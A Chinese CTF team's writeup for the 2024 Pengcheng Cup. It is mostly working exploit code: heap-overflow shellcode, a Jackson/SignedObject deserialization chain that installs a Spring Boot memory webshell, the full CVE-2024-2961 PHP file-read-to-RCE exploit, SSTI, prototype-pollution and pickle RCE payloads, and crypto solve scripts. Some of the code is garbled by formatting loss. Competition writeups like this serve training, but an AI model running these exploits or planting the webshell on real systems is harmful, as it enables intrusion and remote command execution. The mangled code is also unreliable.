# 2024鹏程杯 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/214840.html
> ID: 214840

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

Pwn

cool_book:

add里边有漏洞

50个堆块都创建完后并且返回main函数后，刚好可以溢出v6越界覆盖返回地址为堆地址写shellcode，

又由于开了沙箱

所以直接手写一点写汇编打orw即可。

from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

context.terminal = ['tmux','splitw','-h']
def debug(c = 0):
if(c):
gdb.attach(p, c)
else:
gdb.attach(p)
pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa = lambda text,data :p.sendafter(text, data)
sl = lambda data :p.sendline(data)
sla = lambda text,data :p.sendlineafter(text, data)
r = lambda num=4096 :p.recv(num)
rl = lambda text :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter = lambda :p.interactive()
l32 = lambda :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32 = lambda :
u32(p.recv(4).ljust(4,b'x00'))
uu64 = lambda :
u64(p.recv(6).ljust(8,b'x00'))
int16 = lambda data :
int(data,16)
lg= lambda s, num :p.success('%s -&gt; 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')

#p = process('./cool_book')
p=remote('192.168.18.22',8888)
elf = ELF('./cool_book')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def add(idx, content):
sla(b'3.exitn', b'1')
sla(b'input idxn', str(idx))
sa(b'input contentn', content)
def free(idx):
sla(b'3.exitn', b'2')
sla(b'input idxn', str(idx))

rl(b'addr=')
heap_base=int16(r(14))

for i in range(46):
add(i,b'x90'*0x1)

sc=shellcraft.open('/flag')#pwntools自带的生成这个函数的代码

sc+=shellcraft.read(3,heap_base-0x100,0x30)

sc+=shellcraft.write(1,heap_base-0x100,0x30)

add(46,b'x90'*0x1)#heap_base+0x910
add(47,b'x90'*0x1)#heap_base+0x940
add(48,b'x90'*0x1)#heap_base+0x940

add(49,asm('mov rdi,0;mov rsi,rbp;pop rax;pop rcx;pop rdx;syscall'))#heap_base+0x9a0

lg('heap_base',heap_base)

#gdb.attach(p,'b *$rebase(0x12c9)')

sla(b'3.exitn', b'3')
sleep(2)
s(b'x90'*0x40+asm(sc))
pr()
# pause()

 Web

LOOKUP

没ban SignedObject二次反序列化直接打JacksonToSignedObject。

package gadget.doubleunser;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import gadget.memshell.SpringBootMemoryShellOfController;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;
import org.springframework.aop.framework.AdvisedSupport;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.security.*;
import java.util.Base64;
import java.util.PriorityQueue;

public class JacksonToSignedObject {
public static void main(String[] args) throws Exception {
CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
ctClass.removeMethod(writeReplace);
// 将修改后的CtClass加载至当前线程的上下文类加载器中
ctClass.toClass();

TemplatesImpl templates = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
POJONode node2 = new POJONode(templates);
BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(null);
ReflectionUtils.setFieldValue(badAttributeValueExpException2,"val",node2);

// BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(node2);

//二次反序列化
KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();
SignedObject signedObject = new SignedObject(badAttributeValueExpException2, kp.getPrivate(), Signature.getInstance("DSA"));

//触发SignedObject#getObject
POJONode node = new POJONode(signedObject);

BadAttributeValueExpException o = new BadAttributeValueExpException(null);
ReflectionUtils.setFieldValue(o,"val",node);
// ReflectionUtils.setFieldValue(queue, "queue", new Object[]{signedObject, signedObject});

byte[] payload = SerializerUtils.serialize(o);
System.out.println(Base64.getEncoder().encodeToString(payload));

SerializerUtils.unserialize(payload);
// ObjectInputStream ois = new MyInputStream(new ByteArrayInputStream(payload));
// ois.readObject();
}
public static Object makeTemplatesImplAopProxy() throws Exception {
AdvisedSupport advisedSupport = new AdvisedSupport();
// Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
// Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
// Object template = GadgetUtils.getTemplatesImplReverseShell()
Object template = GadgetUtils.getTemplatesImpl("calc");
advisedSupport.setTarget(template);
Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
return proxy;
}
}

上Spring Boot内存马

package gadget.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringBootMemoryShellOfController extends AbstractTranslet {
public Integer i = 0 ;

public SpringBootMemoryShellOfController() throws Exception{
// 1. 利用spring内部方法获取context
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
// 2. 从context中获得 RequestMappingHandlerMapping 的实例
RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
configField.setAccessible(true);
RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);

// 3. 通过反射获得自定义 controller 中的 Method 对象
Method method = SpringBootMemoryShellOfController.class.getMethod("test",HttpServletRequest.class, HttpServletResponse.class);

// 在内存中动态注册 controller
RequestMappingInfo info = RequestMappingInfo.paths("/test1").options(config).build();

if(i==0){
SpringBootMemoryShellOfController springBootMemoryShellOfController = new SpringBootMemoryShellOfController("aaa");
mappingHandlerMapping.registerMapping(info, springBootMemoryShellOfController, method);
System.out.println(i);
i=1;
}

}

public SpringBootMemoryShellOfController(String test){

}

public void test(HttpServletRequest request, HttpServletResponse response) throws Exception{
if (request.getHeader("squirt1e") != null) {
boolean isLinux = true;
String osTyp = System.getProperty("os.name");
if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains("win")) {
isLinux = false;
}
String[] cmds = isLinux ? new String[]{"sh", "-c", request.getHeader("squirt1e")} : new String[]{"cmd.exe", "/c", request.getHeader("squirt1e")};
InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
Scanner s = new Scanner(in).useDelimiter("A");
String output = s.hasNext() ? s.next() : "";
response.getWriter().write(output);
response.getWriter().flush();
}
}

@Override
public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

}

@Override
public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

}
}

fileread:

打cve就行了 filterchain不知道为什么打不明白

改一下交互就行了，修改后的利用脚本如下：

#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *

HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")

class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        # print(path)
        path = 'O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:'+str(len(path))+':"'+path+'";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:
123;s:7:"fileput";}}'
        print(path)
        path = base64.encode(path.encode())
        return self.session.get(self.url+"?ser="+path)
        # return self.session.post(self.url, data={"file": path})
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        print(response.text)
        data = re.search(b"Your file:(.*)",response.text.encode()).group(1)
        return base64.decode(data)

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            
except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:
text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:
text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:
text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)b" r".*" r"s([-rwx]{3}[ps])s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        print(local_path)
        open(local_path, "wb").write(data)
        # f.close()
        # Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:
zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0n".ljust(step2_size, b"x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:
text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        
except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()

def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]

def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()

def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)

def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:
02x}" for x in data).upper().encode()

def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket

def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004nABCDn`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"nn")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"n" + data + b"n"

@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start

Exploit()

/readflag>a.txt

python口算

import time
import requests
import re

url = 'http://192.168.18.28/'

def get_expression():
try:
response = requests.get(url + 'calc')
response.raise_for_status()
expression = re.search(r'([d+-*/() .]+)', response.text)
if expression:
return expression.group(1)
else:
print("没有找到有效的计算表达式，返回页面内容：")
print(response.text)
return None
except requests.RequestException as e:
print(f"请求失败: {e}")
return None

def calculate_expression(expression):
try:
result = eval(expression)
return result
except Exception as e:
print(f"计算错误: {e}")
return None

def submit_answer(result):
try:
# params = {'answer': result,'username':"sq"}
response = requests.post(url+f"?answer={result}",data={'username':"{{g.pop.__globals__.__builtins__['__import__']('os').popen('cat${IFS}/flag').read()}}"})
response.raise_for_status()
print(f"答案提交成功，服务器回显: {response.text}")
except requests.RequestException as e:
print(f"提交答案失败: {e}")

def main():
expression = get_expression()
if expression:
print(f"获取到新的表达式: {expression}")
result = calculate_expression(expression)
if result is not None:
print(f"计算结果: {result}")
submit_answer(result)
else:
print("计算失败，跳过此次提交")

if __name__ == '__main__':
main()

ezlaravel

CVE-2021-3129 https://github.com/zhzyker/CVE-2021-3129 参照这个直接嗦就行了，gadget打Laravel/RCE6：

notadmin:

原型链污染

POST /login HTTP/1.1
Host: 192.168.18.21
Content-Length: 495
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0
Content-Type: application/json
Accept: */*
Origin: http://192.168.18.21
Referer: http://192.168.18.21/login
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"__proto__":{"secretKey":"123",
"code":"Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`676c6f62616c2e70726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428226368696c645f70726f6365737322292e6578656353796e632822636174202f666c61673e2e2f7075626c69632f6c6f67696e2e6a732229`,`he`.concat(`x`)).toString())"},
"username":"admin",
"password":"admin"}

ezPython

黑盒题

http://192.168.18.23/protected

/protected

/login

test/123456弱口令登录

爆破jwt得到key
IMG_256

key：a123456

伪造成admin

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MzExNDMzOTR9.H-ArN4DYdtJmtiTwfdWJ8foll007GeJgMuCmj4tAHkk

提示有/ser反序列化

import pickle
import base64

def hhhhackme(pickled):

data = base64.urlsafe_b64decode(pickled)

deserialized = pickle.loads(data)nnn return '', 204"

报错回显： raise Exception得到flag

#encoding: utf-8

import os

import pickle

import base64

class ##tttang##(##object##):

def ##__reduce__##(self):

return (##exec##,("raise Exception(__import__('os').popen('cat /flag').read())",))

a=tttang()

payload=pickle.dumps(a)

a = base64.b64encode(payload) ##print##(a)

# pickle.loads(payload)

IMG_257

 Crypto:

babyenc-pcb2024

第一部分构造一下还原n即可恢复第一个flag，第二部分构造一个等式用copper还原就好

考虑CRT:

e = [43, 37, 53, 61, 59]
c1 = [304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117, 300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224, 294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531, 255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835, 194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978]
n = 16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067
c2 = [12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364, 13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932]
a=pow(c1[0],e[1])-pow(c1[1],e[0])
b=pow(c1[2],e[3])-pow(c1[3],e[2])
import gmpy2
n1=gmpy2.gcd(a,b)
from Crypto.Util.number import *
b=c2[0]+c2[1]
c=c2[0]*c2[1]
R.&lt;x&gt;=Zmod(n)[]
f=x^2-b*x+c
print(f.small_roots(X=2^400))
print(long_to_bytes(n1&gt;&gt;310)+long_to_bytes(146436625375651639081292195233290471195543268962429))
#flag{3e99c26b-efdd-4cd2-bbe5-1420eaaa3b30}

tarssc-pcb2024

题目说 crt rsa，给的 p,q 是不平衡的，顺藤摸瓜。

查到论文 Cryptanalysis of Unbalanced RSA with Small CRT-Exponent

然后找到讲dp泄露这篇文章

https://www.cnblogs.com/vconlln/p/17066500.html#%E6%83%85%E5%BD%A22—qn0468-

找到题目脚本 http://blog.tolinchan.xyz/2022/12/05/nctf-2022-official-writeup-crypto/#dp_promax

